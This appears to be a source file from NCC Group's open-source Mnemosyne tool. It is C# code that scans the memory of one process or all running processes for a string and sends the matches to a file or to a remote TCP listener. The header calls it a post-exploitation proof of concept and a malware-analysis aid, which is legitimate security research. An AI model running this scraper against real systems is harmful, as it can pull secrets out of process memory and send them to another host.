/*
Released as open source by NCC Group Plc - http://www.nccgroup.com/

Developed by Matt Lewis, matt dot lewis at nccgroup dot trust

https://github.com/nccgroup/mnemosyne

Released under AGPL see LICENSE for more information

Mnemosyne - A Memory Scraper

Written by Matt Lewis, NCC Group 2017
Synopsis - scans a process memory space for a search string (unicode and ascii)
then if found, spits these out either to stdout, a file or a socket to a remote listener

Useful for memory scraping a process, a post-exploitation POC, an analysis mechanism for malware  or 
an instrumentation tool to be used during fuzzing

Code adapted from http://www.codeproject.com/Articles/716227/Csharp-How-to-Scan-a-Process-Memory
Original code licensed under CPOL: http://www.codeproject.com/info/cpol10.aspx
*/

using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using MemoryScanner.Resources;

namespace MemoryScanner
{
    internal class MemScan
    {
        public static void ScanMemory(CliArgs myargs)
        {
            Socket sender = null;
            StreamWriter file = null;

            if (myargs.Mode.Equals(ProgObj.ArgSocket)) sender = WriteToSocket(myargs, sender);

            if (myargs.Mode.Equals(ProgObj.ArgFile)) file = WriteToFile(myargs, file);

            // Get all running processes.
            Process[] localAll = System.Diagnostics.Process.GetProcesses();

            // If we're not proc-hopping, just fill the array with the same PID of our target.
            // A bit of a fudge but avoids lots of duplicate code otherwise...
            if (!myargs.ProcHop)
            {
                for (int i = 0; i < localAll.Length; i++)
                    localAll[i] = Process.GetProcessById(myargs.Pid);
            }

            while (true)
            {
                foreach (Process process in localAll)
                {
                    new ProcessSearch(myargs, process, sender, file).SearchProcessForString();
                }
            }

            // ask Turing if we'll ever get here...
            sender.Shutdown(SocketShutdown.Both);
            sender.Close();
            if (myargs.Mode.Equals("file"))
            {
               file.Close();
            }
        }

        private static StreamWriter WriteToFile(CliArgs myargs, StreamWriter file)
        {
            file = new StreamWriter(myargs.Filename);
            return file;
        }

        private static Socket WriteToSocket(CliArgs myargs, Socket sender)
        {
            try
            {
                var ipAddress = IPAddress.Parse(myargs.Ipaddr);
                var remoteIp = new IPEndPoint(ipAddress, myargs.Portnum);

                sender = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                sender.Connect(remoteIp);
                Console.WriteLine(MessageStrings.SearchStartMessageForStandardIO, sender.RemoteEndPoint);
            }
            catch (SocketException se)
            {
                Console.WriteLine(ErrorStrings.SocketExceptionError, se);
            }
            return sender;
        }
    }
}